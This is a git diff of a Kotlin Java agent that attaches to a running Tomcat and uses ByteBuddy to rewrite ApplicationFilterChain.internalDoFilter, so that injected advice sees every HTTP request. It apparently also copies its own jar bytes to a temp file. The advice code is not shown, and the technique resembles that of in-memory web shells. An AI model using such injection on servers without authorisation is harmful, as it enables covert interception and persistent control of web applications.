@@ -1,24 +1,26 @@
 package com.xhstormr.app
 
-import java.lang.instrument.Instrumentation
-import kotlin.concurrent.thread
 import net.bytebuddy.agent.builder.AgentBuilder
 import net.bytebuddy.asm.Advice
 import net.bytebuddy.matcher.ElementMatchers
+import java.lang.instrument.Instrumentation
+import kotlin.concurrent.thread
+import kotlin.io.path.createTempFile
+import kotlin.io.path.writeBytes
 
 fun agentmain(args: String, inst: Instrumentation) {
+    val clazz = "org.apache.catalina.core.ApplicationFilterChain"
+    val method = "internalDoFilter"
 
     val advice = Advice
         .withCustomMapping()
         .bind(clazz<Value>(), args)
-        .to(clazz<Tracing>())
-        .on(ElementMatchers.named("internalDoFilter"))
 
     AgentBuilder.Default()
         .with(AgentBuilder.Listener.StreamWriting.toSystemOut().withErrorsOnly())
-        .with(AgentBuilder.RedefinitionStrategy.REDEFINITION)
-        .type(ElementMatchers.named("org.apache.catalina.core.ApplicationFilterChain"))
-        .transform { builder, _, _, _ -> builder.visit(advice) }
+        .with(AgentBuilder.RedefinitionStrategy.RETRANSFORMATION)
+        .type(ElementMatchers.named(clazz))
+        .transform(AgentBuilder.Transformer.ForAdvice(advice).advice(ElementMatchers.named(method), clazz<Tracing>().name))
         .installOn(inst)
 
     val agentBytes = getCurrentJar().run {
@@ -37,5 +39,5 @@ fun agentmain(args: String, inst: Instrumentation) {
 }
 
 /*
-https://github.com/apache/tomcat/blob/master/java/org/apache/catalina/core/ApplicationFilterChain.java
+https://github.com/apache/tomcat/blob/10.1.x/java/org/apache/catalina/core/ApplicationFilterChain.java#L153
 */
